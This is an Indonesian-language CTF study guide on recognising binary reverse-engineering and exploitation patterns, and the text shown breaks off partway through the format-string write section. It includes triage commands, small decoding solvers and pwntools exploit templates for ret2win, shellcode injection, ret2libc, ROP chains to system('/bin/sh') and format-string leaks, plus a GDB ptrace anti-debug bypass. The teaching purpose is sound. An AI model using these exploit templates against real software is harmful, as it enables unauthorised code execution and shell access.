---
id: "52"
title: "🧩 File 52 — CTF Binary Patterns"
category: "6. Binary & Reversing"
categoryId: "binary"
filename: "52_ctf_binary_patterns.md"
refs_out: ["48","49","50","51","53"]
refs_in: ["50","53"]
---

# 🧩 File 52 — CTF Binary Patterns

> **Tujuan utama:** mengenali pola Binary CTF dengan cepat, memilih workflow yang tepat, lalu mengeksekusinya tanpa mengulang proses belajar dari nol.

**Series:** Binary Exploitation  
**Level:** Beginner → Intermediate  
**Environment:** Parrot OS XFCE / Debian-based  
**Target:** Hack The Box, TryHackMe, picoCTF, pwn.college  
**Fokus:** Pattern Recognition + Rapid Triage + Workflow Selection

---

# 🗺️ Daftar Isi

- [🎯 Bagian 0 — Konsep CTF Binary Patterns](#-bagian-0--konsep-ctf-binary-patterns)
- [🧠 Bagian 1 — Pola RE](#-bagian-1--pola-re-reverse-engineering)
- [💥 Bagian 2 — Pola PWN](#-bagian-2--pola-pwn-binary-exploitation)
- [⏱️ Bagian 3 — Triage Framework 5 Menit](#%EF%B8%8F-bagian-3--triage-framework-5-menit)
- [🧰 Bagian 4 — Pwntools Boilerplate Templates](#-bagian-4--pwntools-boilerplate-templates)
- [🐛 Bagian 5 — Debugging Pwntools](#-bagian-5--debugging-pwntools)
- [🔀 Bagian 6 — Pattern Identification Flowchart](#-bagian-6--pattern-identification-flowchart)
- [📝 Bagian 7 — Mini CTF Writeup Templates](#-bagian-7--mini-ctf-writeup-templates)
- [🔧 Bagian 8 — Common Errors & Troubleshooting](#-bagian-8--common-errors--troubleshooting)
- [⚡ Bagian 9 — Cheatsheet Cepat](#-bagian-9--cheatsheet-cepat)
- [🏆 Bagian 10 — Golden Rules Binary CTF](#-bagian-10--golden-rules-binary-ctf)
- [🔗 Bagian 11 — Cross-Workflow](#-bagian-11--cross-workflow)
    

---

# 🎯 BAGIAN 0 — KONSEP CTF BINARY PATTERNS

## 0.1 🧩 Apa Itu Binary Pattern Recognition?

**Binary Pattern Recognition** adalah kemampuan melihat ciri-ciri sebuah challenge, lalu segera memetakan ciri tersebut ke kelas masalah dan workflow tertentu.

Daripada berpikir:

> "Saya harus ingat semua teknik exploitation."

Lebih berguna untuk berpikir:

> "Saya melihat `gets()`, Canary OFF, NX OFF, lalu ada fungsi `win()`. Ini kemungkinan besar stack overflow + ret2win."

Jadi tujuan akhirnya bukan hanya **mengetahui teknik**, tetapi mampu **mengenali kapan teknik tersebut relevan**.

### 🏠 Analogi sederhana

Bayangkan dokter menerima pasien.

Dokter tidak langsung melakukan semua pemeriksaan yang tersedia.

Ia melihat:

```text
Gejala
  ↓
Pemeriksaan awal
  ↓
Pola penyakit
  ↓
Diagnosis
  ↓
Treatment
```

Binary CTF bekerja dengan cara yang mirip:

```text
Binary Challenge
      ↓
   Triage
      ↓
 Identifikasi pola
      ↓
 Pilih workflow
      ↓
 Exploit / Analyze
      ↓
     Flag
```

### 🔍 Teknik vs Pattern

|Belajar Teknik|Belajar Pola|
|---|---|
|"Saya tahu ROP"|"Saya tahu kapan ROP diperlukan"|
|"Saya tahu GDB"|"Saya tahu kapan harus membuka GDB"|
|"Saya tahu XOR"|"Saya mengenali loop XOR saat membaca decompiler"|
|"Saya tahu format string"|"Saya mengenali `printf(user_input)` sebagai primitive leak/write|
|"Saya tahu ret2libc"|"Saya tahu NX ON berarti shellcode langsung kemungkinan gagal"|

### 🚀 Kenapa pattern recognition mempercepat solve time?

Tanpa pattern recognition:

```text
Challenge
   ↓
Coba strings
   ↓
Coba Ghidra
   ↓
Coba GDB
   ↓
Coba exploit random
   ↓
Gagal
   ↓
Coba teknik lain
```

Dengan pattern recognition:

```text
Challenge
   ↓
5-minute triage
   ↓
"NX ON + No PIE + gets()"
   ↓
Ret2libc / ROP
   ↓
Offset
   ↓
Exploit
```

### 🧠 Mental Model

Gunakan formula:

```text
SIGNAL
  ↓
PATTERN
  ↓
TECHNIQUE
  ↓
WORKFLOW
  ↓
PAYLOAD / SOLVER
```

Contoh:

```text
gets()
No Canary
NX OFF
      ↓
Stack Buffer Overflow
      ↓
PWN-2 / PWN-3
      ↓
Offset + RIP overwrite
      ↓
ret2win atau shellcode
```

---

## 0.2 📖 Cara Menggunakan File Ini

File ini **bukan pengganti** File 48–51.

File ini berfungsi sebagai **index + pattern recognition layer**.

### Langkah 1 — Identifikasi kategori challenge

Pertanyaan pertama:

```text
Apakah challenge meminta:
- memahami binary?
- mencari password?
- membypass check?
- memperoleh shell?
- overwrite memory?
- leak address?
```

Kemudian klasifikasikan:

```text
RE
├── CrackMe
├── XOR
├── Hash
├── Encoding
├── Anti-Debug
└── Packed / Stripped

PWN
├── Stack Overflow
├── ret2win
├── Shellcode
├── ret2libc
├── ROP
├── Format String
├── PIE/ASLR
└── Heap
```

### Langkah 2 — Jalankan checklist pola

Mulai dari:

```bash
# Identifikasi tipe file.
file ./challenge

# Periksa proteksi binary.
checksec --file=./challenge

# Cari string menarik.
strings -n 6 ./challenge | less

# Coba dynamic tracing jika binary dynamically linked.
ltrace ./challenge <<< "AAAA"
```

### Langkah 3 — Ambil workflow terkait

Gunakan file berdasarkan pola:

```text
File 48
   ↓
Binary Analysis
   ↓
File 49
   ↓
Buffer Overflow
   ↓
File 50
   ↓
ROP Chain
   ↓
File 51
   ↓
Reverse Engineering
   ↓
File 52
   ↓
Pattern Recognition
```

### Hubungan File 48–52

|File|Peran|
|---|---|
|**48**|Memahami properti dan struktur binary|
|**49**|Memahami stack buffer overflow|
|**50**|Memahami ROP|
|**51**|Memahami reverse engineering|
|**52**|Mengenali pola dan memilih workflow|

**File 52 bukan teknik baru utama.**

Ia adalah **lapisan pengambilan keputusan**.

---

## 0.3 🗂️ Taksonomi Binary CTF

|Kategori|Sub-Kategori|Trigger Utama|Tools Utama|File Workflow|
|---|---|---|---|---|
|RE|CrackMe|Input dibandingkan dengan secret|Ghidra, ltrace|File 51|
|RE|Hardcoded Comparison|`strcmp`, `memcmp`|ltrace, Ghidra|File 51|
|RE|Single-Byte XOR|`^ constant`|Ghidra, Python|File 51|
|RE|Repeating XOR|`i % key_len`|Ghidra, Python|File 51|
|RE|Reversed String|Reverse loop|Ghidra, Python|File 51|
|RE|Hash Verification|MD5/SHA/custom hash|Ghidra, Python|File 51|
|RE|Custom Encoding|Lookup table|Ghidra, Python|File 51|
|RE|Anti-Debug|`ptrace()`|GDB, strace, Ghidra|File 51|
|RE|Packed|UPX signature|strings, upx|File 51|
|RE|Stripped|Symbol names hilang|Ghidra, objdump|File 51|
|RE|Multi-Stage|Banyak layer decrypt|Ghidra, debugger|File 51|
|PWN|ret2win|Fungsi `win()`|pwntools, GDB|File 49|
|PWN|Stack BOF|`gets/strcpy/read`|GDB, pwntools|File 49|
|PWN|Shellcode|NX OFF|pwntools|File 49|
|PWN|ret2libc|NX ON|pwntools, GDB|File 49|
|PWN|ROP|Gadget chain|ROPgadget, pwntools|File 50|
|PWN|FSB Read|`printf(input)`|pwntools|File 49|
|PWN|FSB Write|`%n` / GOT overwrite|pwntools|File 49|
|PWN|PIE + ASLR|Address leak|GDB, pwntools|File 50|
|PWN|UAF|`free()` lalu akses pointer|GDB, pwntools|File 49/50|
|PWN|One Gadget|libc base diketahui|one_gadget, pwntools|File 50|

---

# 🧠 BAGIAN 1 — POLA RE (REVERSE ENGINEERING)

> **Prinsip:**  
> **Lihat trigger → kenali pola → ambil workflow → eksekusi.**

---

## 🔎 Pola RE-1: Hardcoded String Comparison

**Trigger/Sinyal:**

- Binary dynamically linked.
    
- Program menerima input.
    
- Ada `strcmp()`, `strncmp()`, atau `memcmp()`.
    
- `ltrace` menunjukkan input dibandingkan dengan string tertentu.
    
- Ada output seperti `Correct`, `Wrong`, `Access granted`.
    

**Tools:**

```text
file
strings
ltrace
Ghidra
```

**Workflow Cepat:**

```text
Step 1 → ltrace ./challenge
Step 2 → cari strcmp/memcmp
Step 3 → identifikasi nilai pembanding
Step 4 → kirim nilai tersebut
```

**Command Kunci:**

```bash
# Jalankan program sambil melihat library call.
ltrace ./challenge <<< "AAAA"

# Cari fungsi comparison dari strings/symbols.
strings ./challenge | grep -Ei "strcmp|memcmp|strncmp"
```

**Contoh output realistis:**

```text
strcmp("AAAA", "supersecret") = -18
puts("Wrong password")
```

**Interpretasi:**

```text
Input      = AAAA
Target     = supersecret
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

# Hardcoded comparison sederhana.
target = b"supersecret"

print(target.decode())
```

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 2–10 menit

---

## 🔐 Pola RE-2: Single-Byte XOR

**Trigger/Sinyal:**

- Decompiler menunjukkan operator `^`.
    
- Key berupa satu angka konstan.
    
- Contoh:  
    `data[i] ^ 0x42`
    
- Hasil dibandingkan dengan array/string lain.
    

**Tools:**

```text
Ghidra
Python
gdb
```

**Workflow Cepat:**

```text
Step 1 → cari loop XOR
Step 2 → catat constant key
Step 3 → ambil ciphertext
Step 4 → XOR dengan key
```

**Command Kunci:**

```bash
# Cari indikasi XOR dari hasil disassembly.
objdump -d ./challenge | grep -E "xor|xorb|xorl|xorq"
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

# Contoh single-byte XOR.
data = bytes.fromhex("161b111611")
key = 0x42

# Decode setiap byte dengan key yang sama.
decoded = bytes(b ^ key for b in data)

print(decoded)
```

**Contoh hasil:**

```text
b'TEST!'
```

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 5–15 menit

---

## 🔁 Pola RE-3: Multi-Byte Repeating XOR

**Trigger/Sinyal:**

- XOR menggunakan array key.
    
- Ada:  
    `key[i % key_len]`
    
- Panjang key lebih dari satu byte.
    
- Loop berulang menggunakan key yang sama.
    

**Workflow Cepat:**

```text
Step 1 → identifikasi key
Step 2 → identifikasi ciphertext
Step 3 → cek modulo key length
Step 4 → implementasikan repeating XOR
```

**Command Kunci:**

```bash
# Cari operasi modulo dan XOR di assembly.
objdump -d ./challenge | grep -E "xor|div|idiv|and"
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

# Repeating XOR dengan key beberapa byte.
cipher = bytes.fromhex("071d000f0b")

# Key yang ditemukan dari reverse engineering.
key = b"KEY"

# Terapkan key secara berulang.
plain = bytes(
    cipher[i] ^ key[i % len(key)]
    for i in range(len(cipher))
)

print(plain)
```

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 10–25 menit

---

## 🔄 Pola RE-4: Reversed String Check

**Trigger/Sinyal:**

- Program membalik string sebelum membandingkan.
    
- Decompiler menunjukkan pointer dari karakter terakhir menuju awal.
    
- Ada pola:  
    `len - 1 - i`
    
- Input benar jika urutannya terbalik.
    

**Workflow Cepat:**

```text
Step 1 → cari loop string
Step 2 → lihat arah pointer
Step 3 → identifikasi string target
Step 4 → reverse
```

**Command Kunci:**

```bash
# Cari indikasi reverse dari strings dan assembly.
objdump -d ./challenge | grep -Ei "cmp|mov|lea|sub"
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

# String yang ditemukan pada binary.
encoded = "321galf"

# Balik string.
flag = encoded[::-1]

print(flag)
```

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 5–15 menit

---

## #️⃣ Pola RE-5: Hash Verification

**Trigger/Sinyal:**

- Program melakukan hashing terhadap input.
    
- Import seperti:  
    `MD5`  
    `SHA1`  
    `SHA256`
    
- Output hash dibandingkan dengan constant.
    
- Password asli tidak disimpan secara plaintext.
    

**Workflow Cepat:**

```text
Step 1 → identifikasi algoritma
Step 2 → ambil expected hash
Step 3 → tentukan candidate input
Step 4 → hash candidate
Step 5 → bandingkan
```

**Command Kunci:**

```bash
# Cari nama algoritma hashing pada binary.
strings ./challenge | grep -Ei "md5|sha1|sha256|sha512"

# Lihat library call jika symbol tersedia.
ltrace ./challenge <<< "AAAA"
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

import hashlib

# Candidate password.
candidate = b"password123"

# Hitung SHA-256.
digest = hashlib.sha256(candidate).hexdigest()

# Hash target yang ditemukan saat reverse engineering.
target = "ef92b778bafe771e89245b89ecbc08a44a4e1669c0663a5c..."

# Bandingkan secara sederhana.
print("MATCH" if digest == target else "NO MATCH")
```

> **Catatan:** mengetahui algoritma hash tidak otomatis memberikan plaintext. Bisa diperlukan dictionary, brute force terbatas, atau analisis candidate generation.

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 10–60+ menit

---

## 🧮 Pola RE-6: Custom Base Encoding

**Trigger/Sinyal:**

- Lookup table.
    
- Array berisi 32/58/64 karakter atau jumlah yang mirip.
    
- Operasi bit shifting dan masking.
    
- Encoding sendiri menyerupai Base32/Base58/Base64.
    
- Output tampak seperti ASCII tetapi tidak langsung terbaca.
    

**Workflow Cepat:**

```text
Step 1 → cari alphabet
Step 2 → cari lookup table
Step 3 → identifikasi input/output bit width
Step 4 → reconstruct decoder
```

**Command Kunci:**

```bash
# Cari string panjang yang berpotensi menjadi custom alphabet.
strings ./challenge | grep -E ".{32,}"
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

# Contoh custom alphabet.
alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

# Data encoded yang ditemukan.
encoded = "VEVTVA=="

# Untuk encoding standar gunakan base64.
import base64

decoded = base64.b64decode(encoded)

print(decoded)
```

> **Penting:** jangan menganggap setiap tabel 64 karakter sebagai Base64. Validasi algoritmanya dari decompiler.

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 15–45 menit

---

## 🐞 Pola RE-7: Anti-Debug `ptrace`

**Trigger/Sinyal:**

- Program berjalan normal tetapi keluar ketika di-GDB.
    
- Exit code tertentu.
    
- Import:  
    `ptrace()`
    
- Ghidra menunjukkan pemeriksaan return value.
    
- `strace` menunjukkan syscall terkait tracing.
    

**Workflow Cepat:**

```text
Step 1 → jalankan normal
Step 2 → jalankan GDB
Step 3 → bandingkan behavior
Step 4 → cari ptrace
Step 5 → pahami branch anti-debug
```

**Command Kunci:**

```bash
# Jalankan normal untuk melihat behavior.
./challenge

# Jalankan menggunakan GDB.
gdb ./challenge

# Cari penggunaan ptrace dalam dynamic trace.
ltrace ./challenge

# Cari syscall tracing.
strace ./challenge 2>&1 | grep ptrace
```

**GDB Inspection & Bypass:**

```bash
# Jalankan GDB untuk melakukan inspection dan bypass ptrace.
gdb ./challenge

# Option 1: GDB catchpoint bypass (Tercepat)
(gdb) catch syscall ptrace
(gdb) run
(gdb) finish
(gdb) set $rax = 0
(gdb) continue

# Option 2: Set breakpoint sebelum check anti-debug.
(gdb) break main
(gdb) run
```

> 💡 **Bypass Detail & Script Patching:** Untuk penjelasan lengkap bypass anti-debug via GDB atau permanent binary patching, lihat **File 51 Bagian 6.3**.

**Referensi:** → [**File 51: RE (Bagian 6.3)**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 10–30 menit

---

## 📦 Pola RE-8: UPX Packed Binary

**Trigger/Sinyal:**

- `strings` mengandung:  
    `UPX`
    
- Binary jauh lebih kecil atau tampak memiliki section khas packer.
    
- `file` atau metadata menunjukkan UPX.
    
- Static analysis menghasilkan fungsi yang tidak informatif.
    

**Workflow Cepat:**

```text
Step 1 → cek UPX
Step 2 → jangan reverse stub terlalu lama
Step 3 → unpack
Step 4 → ulangi triage
```

**Command Kunci:**

```bash
# Periksa signature UPX.
strings ./challenge | grep -i "UPX"

# Periksa metadata.
file ./challenge

# Coba periksa apakah binary bisa dibuka oleh UPX.
upx -t ./challenge

# Buat salinan sebelum melakukan perubahan.
cp ./challenge ./challenge.backup

# Unpack hanya pada binary salinan.
upx -d ./challenge
```

**Contoh output:**

```text
Packed ELF
UPX!
UPX 4.x
```

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 5–15 menit

---

## 🪦 Pola RE-9: Stripped Binary RE

**Trigger/Sinyal:**

- `file` menunjukkan `stripped`.
    
- `nm` tidak memberikan symbol berguna.
    
- Nama fungsi seperti `FUN_00101234`.
    
- `ltrace` dapat tetap berfungsi untuk dynamically linked functions, tetapi symbol internal binary hilang.
    

**Workflow Cepat:**

```text
Step 1 → konfirmasi stripped
Step 2 → cari `main` melalui entry/reference
Step 3 → cari strings dan xrefs
Step 4 → identifikasi function boundaries
Step 5 → analisis behavior
```

**Command Kunci:**

```bash
# Cek apakah binary stripped.
file ./challenge

# Coba lihat symbol.
nm ./challenge 2>/dev/null | head

# Cari entry point.
readelf -h ./challenge | grep -i "Entry"

# Cari string menarik.
strings -n 6 ./challenge
```

**Catatan:**

`stripped` **bukan berarti tidak bisa dianalisis**.

Yang hilang terutama adalah metadata symbol. Kode mesin tetap ada.

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 15–60 menit

---

## 🔓 Pola RE-10: Multi-Stage Decryption

**Trigger/Sinyal:**

- Banyak fungsi `decrypt`, `decode`, `transform`.
    
- Hasil stage pertama menjadi input stage berikutnya.
    
- Ada beberapa constant/key.
    
- Flag tidak pernah muncul plaintext dalam binary.
    

**Workflow Cepat:**

```text
Step 1 → cari entry point
Step 2 → gambar dependency antar decrypt function
Step 3 → catat input/output setiap stage
Step 4 → solve stage 1
Step 5 → gunakan hasil sebagai input stage berikutnya
```

**Diagram:**

```text
Encrypted Data
      |
      v
+-------------+
| decrypt_1() |
+-------------+
      |
      v
+-------------+
| transform() |
+-------------+
      |
      v
+-------------+
| decrypt_2() |
+-------------+
      |
      v
    FLAG
```

**Command Kunci:**

```bash
# Cari function atau string terkait decrypt.
strings ./challenge | grep -Ei "decrypt|decode|key"

# Cari instruksi XOR/bitwise.
objdump -d ./challenge | grep -Ei "xor|rol|ror|shl|shr"
```

**Referensi:** → [**File 51: RE**](https://arena.ai/c/<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>)

**Waktu Estimasi:** 20–90 menit

---

# 💥 BAGIAN 2 — POLA PWN (BINARY EXPLOITATION)

> **Mindset utama:**  
> **Proteksi menentukan primitive yang tersedia dan primitive menentukan teknik eksploitasi.**

---

## 🏆 Pola PWN-1: ret2win

**Trigger/Sinyal:**

- Ada fungsi `win()`.
    
- Ada `get_flag()`, `shell()`, `print_flag()`, atau fungsi serupa.
    
- Fungsi tersebut tidak dipanggil dalam normal execution.
    
- Biasanya challenge dibuat sebagai latihan stack overwrite.
    

**Tools:**

```text
checksec
GDB/pwndbg
pwntools
```

**Workflow Cepat:**

```text
Step 1 → checksec
Step 2 → cari win()
Step 3 → hitung offset
Step 4 → overwrite RIP/EIP
Step 5 → lompat ke win()
```

**Command Kunci:**

```bash
# Periksa proteksi.
checksec --file=./challenge

# Cari simbol win.
nm ./challenge 2>/dev/null | grep -Ei "win|get_flag|shell"

# Cari fungsi melalui strings/symbols.
objdump -d ./challenge | grep -Ei "win|get_flag|shell"
```

### Full Local Workflow

```bash
# Buat pattern cyclic untuk mencari offset.
python3 - <<'PY'
from pwn import *

# Generate 200 byte cyclic pattern.
print(cyclic(200).decode())
PY
```

Kemudian gunakan pattern pada program dan analisis crash di GDB.

> 💡 **Template Script Exploit Lengkap:** Untuk template script Pwntools `ret2win` lengkap yang siap dipakai, lihat **Bagian 4.2 (Template ret2win)**.

**Referensi:** → [**File 49: Buffer Overflow**](https://arena.ai/c/<a href="/docs/buffer-overflow" class="text-[#00b4d8] hover:underline font-mono font-semibold">49_buffer_overflow_workflow.md</a>)

**Waktu Estimasi:** 5–20 menit

---

## 💥 Pola PWN-2: Classic Stack Buffer Overflow

**Trigger/Sinyal:**

- `gets()`
    
- `strcpy()`
    
- `scanf("%s", ...)`
    
- `read()` dengan size terlalu besar
    
- Canary OFF
    
- Input berada pada stack.
    
- RIP/EIP dapat dikontrol.
    

**Workflow Cepat:**

```text
Step 1 → identifikasi sink input
Step 2 → checksec
Step 3 → crash binary
Step 4 → cari offset
Step 5 → kontrol RIP/EIP
Step 6 → lanjutkan ke ret2win/ROP/ret2libc
```

**Command Kunci:**

```bash
# Periksa proteksi binary.
checksec --file=./challenge

# Cari function input yang berisiko.
objdump -d ./challenge | grep -Ei "gets|strcpy|scanf|read"
```

### Offset

Untuk x86-64:

```text
buffer
 ↓
saved RBP
 ↓
saved RIP
```

Contoh:

```text
AAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAA
BBBBBBBB
```

Jika `BBBBBBBB` muncul sebagai RIP:

```text
OFFSET = posisi byte pertama BBBBBBBB
```

**Python:**

```python
#!/usr/bin/env python3

from pwn import *

# Generate pattern untuk menentukan offset.
pattern = cyclic(200)

print(pattern)

# Setelah crash:
# offset = cyclic_find(value)
```

**Referensi:** → [**File 49: Buffer Overflow**](https://arena.ai/c/<a href="/docs/buffer-overflow" class="text-[#00b4d8] hover:underline font-mono font-semibold">49_buffer_overflow_workflow.md</a>)

**Waktu Estimasi:** 10–30 menit

---

## 🐚 Pola PWN-3: Stack Overflow + Shellcode

**Trigger/Sinyal:**

- Buffer berada di stack.
    
- NX OFF.
    
- Stack executable.
    
- Anda dapat mengontrol instruction pointer.
    
- Shellcode dapat ditempatkan di memory yang executable.
    

**Workflow Cepat:**

```text
Step 1 → checksec
Step 2 → cari buffer
Step 3 → tentukan offset
Step 4 → buat shellcode
Step 5 → letakkan shellcode
Step 6 → return ke alamat shellcode
```

**Command Kunci:**

```bash
# Pastikan NX tidak aktif.
checksec --file=./challenge
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

from pwn import *

# Load ELF challenge.
BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)

# Binary architecture menentukan context shellcode.
context.binary = elf

# Local process.
io = process(BINARY)

# Shellcode untuk spawn shell pada Linux x86-64.
shellcode = asm(shellcraft.sh())

# Contoh placeholder offset.
OFFSET = 40

# Alamat buffer harus diperoleh dari debugging.
BUFFER_ADDR = 0x7fffffffe000

# Payload berisi shellcode dan return address.
payload = flat(
    shellcode,
    b"A" * (OFFSET - len(shellcode)),
    p64(BUFFER_ADDR)
)

# Kirim payload.
io.sendline(payload)

# Interaktif setelah berhasil memperoleh shell.
io.interactive()
```

> **Penting:** alamat stack sering berubah karena ASLR. Template ini adalah pola dasar untuk challenge yang memang menyediakan kondisi tersebut.

**Referensi:** → [**File 49: Buffer Overflow**](https://arena.ai/c/<a href="/docs/buffer-overflow" class="text-[#00b4d8] hover:underline font-mono font-semibold">49_buffer_overflow_workflow.md</a>)

**Waktu Estimasi:** 15–45 menit

---

## 📚 Pola PWN-4: ret2libc

**Trigger/Sinyal:**

- NX ON.
    
- Tidak dapat mengeksekusi shellcode langsung dari stack.
    
- `system()` tersedia di libc.
    
- String `/bin/sh` tersedia.
    
- PIE dapat OFF atau ON.
    
- Untuk ASLR yang aktif, biasanya membutuhkan libc leak.
    

**Workflow Cepat:**

```text
Step 1 → checksec
Step 2 → dapatkan kontrol RIP
Step 3 → cari libc/system/"/bin/sh"
Step 4 → jika ASLR aktif, leak libc
Step 5 → hitung libc base
Step 6 → panggil system("/bin/sh")
```

### Model dasar

```text
libc leak
   ↓
libc base
   ↓
system()
   +
"/bin/sh"
   ↓
shell
```

**Command Kunci:**

```bash
# Cari symbol system dari libc yang disediakan challenge.
nm -D ./libc.so.6 | grep " system"

# Cari string /bin/sh.
strings -a -t x ./libc.so.6 | grep "/bin/sh"

# Periksa proteksi binary.
checksec --file=./challenge
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

from pwn import *
import os

# === CONFIG ===
BINARY = "./challenge"
LIBC = "./libc.so.6"

# === SETUP ===
elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)
context.binary = elf

# === START ===
io = process(BINARY)

# Contoh nilai hasil leak.
# Dalam challenge nyata nilai ini biasanya diperoleh
# dari fungsi leak terlebih dahulu.
leaked_libc = 0x7ffff7dd18b0

# Hitung base address libc.
libc.address = leaked_libc - libc.symbols["puts"]

# Resolve system() setelah base diketahui.
system = libc.symbols["system"]

# Cari "/bin/sh" setelah base diketahui.
bin_sh = next(libc.search(b"/bin/sh\x00"))

# Offset harus diperoleh dengan cyclic pattern.
OFFSET = 40

payload = flat(
    b"A" * OFFSET,
    ret := ROP(libc).find_gadget(["ret"]).address,
    system,
    bin_sh
)

io.sendline(payload)
io.interactive()
```

> **Catatan:** penamaan `ret` di atas valid pada Python modern, tetapi lebih jelas menggunakan variable `RET_GADGET` pada exploit final.

Versi lebih eksplisit:

```python
#!/usr/bin/env python3

from pwn import *

# Load target dan libc.
BINARY = "./challenge"
LIBC = "./libc.so.6"

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)

context.binary = elf

# Jalankan challenge secara lokal.
io = process(BINARY)

# Leak yang diperoleh dari tahap pertama.
leak = 0x7ffff7dd18b0

# Hitung libc base.
libc.address = leak - libc.symbols["puts"]

# Cari gadget ret untuk alignment.
rop = ROP(libc)
RET_GADGET = rop.find_gadget(["ret"]).address

# Resolve fungsi dan string.
SYSTEM = libc.symbols["system"]
BIN_SH = next(libc.search(b"/bin/sh\x00"))

# Offset hasil cyclic_find().
OFFSET = 40

payload = flat(
    b"A" * OFFSET,
    RET_GADGET,
    SYSTEM,
    BIN_SH
)

io.sendline(payload)
io.interactive()
```

**Referensi:** → [**File 49: Buffer Overflow**](https://arena.ai/c/<a href="/docs/buffer-overflow" class="text-[#00b4d8] hover:underline font-mono font-semibold">49_buffer_overflow_workflow.md</a>)

**Waktu Estimasi:** 20–60 menit

---

## 🧱 Pola PWN-5: ROP Chain Basic

**Trigger/Sinyal:**

- NX ON.
    
- Anda dapat mengontrol RIP.
    
- Tidak bisa menjalankan shellcode.
    
- Binary/libc menyediakan gadget.
    
- Perlu mengatur register lalu memanggil fungsi/syscall.
    

**Workflow Cepat:**

```text
Step 1 → offset
Step 2 → cari gadgets
Step 3 → set register
Step 4 → panggil function/syscall
Step 5 → test chain
```

**Command Kunci:**

```bash
# Cari gadget ROP pada binary.
ROPgadget --binary ./challenge

# Cari gadget tertentu.
ROPgadget --binary ./challenge | grep "pop rdi"

# Cari ret gadget.
ROPgadget --binary ./challenge | grep -E " : ret$"
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

from pwn import *

# Load binary.
BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)

# Set architecture context.
context.binary = elf

# Start local process.
io = process(BINARY)

# Build automatic ROP object.
rop = ROP(elf)

# Offset dari cyclic_find().
OFFSET = 40

# Cari gadget untuk mengisi RDI.
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address

# Cari address "/bin/sh" jika tersedia.
BIN_SH = next(elf.search(b"/bin/sh\x00"), None)

# Jika tidak tersedia, gunakan informasi challenge untuk mencari alternatif.
if BIN_SH is None:
    log.warning("No /bin/sh string found in binary.")

# Contoh ROP structure.
payload = flat(
    b"A" * OFFSET,
    POP_RDI,
    BIN_SH,
    elf.plt["system"]
)

io.sendline(payload)
io.interactive()
```

**Referensi:** → [**File 50: ROP Chain**](https://arena.ai/c/<a href="/docs/rop-chain" class="text-[#00b4d8] hover:underline font-mono font-semibold">50_rop_chain_workflow.md</a>)

**Waktu Estimasi:** 15–60 menit

---

## 🧪 Pola PWN-6: Format String Arbitrary Read

**Trigger/Sinyal:**

- `printf(user_input)`.
    
- User-controlled format string.
    
- `%p`, `%x`, `%lx` menghasilkan data.
    
- Bisa membaca stack atau pointer.
    
- Bisa digunakan untuk menemukan canary/libc/PIE address.
    

**Workflow Cepat:**

```text
Step 1 → cari format string sink
Step 2 → brute-force parameter index
Step 3 → leak pointer
Step 4 → klasifikasikan address
Step 5 → hitung base / canary
```

**Command Kunci:**

```bash
# Cari printf dalam binary.
objdump -d ./challenge | grep -E "printf|puts|fprintf"

# Jalankan binary dengan format string sederhana.
./challenge <<< "%p.%p.%p.%p"
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

from pwn import *

# Konfigurasi target.
BINARY = "./challenge"

elf = ELF(BINARY, checksec=False)
context.binary = elf

# Jalankan lokal.
io = process(BINARY)

# Coba beberapa positional parameters.
payload = b"%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p"

io.sendline(payload)

# Ambil output.
output = io.recvall(timeout=2)

print(output)

io.close()
```

**Referensi:** → [**File 49: Buffer Overflow**](https://arena.ai/c/<a href="/docs/buffer-overflow" class="text-[#00b4d8] hover:underline font-mono font-semibold">49_buffer_overflow_workflow.md</a>)

**Waktu Estimasi:** 10–40 menit

---

## ✍️ Pola PWN-7: Format String Arbitrary Write

**Trigger/Sinyal:**

- `printf(user_input)`.
    
- `%n`, `%hn`, `%hhn`, `%ln`.
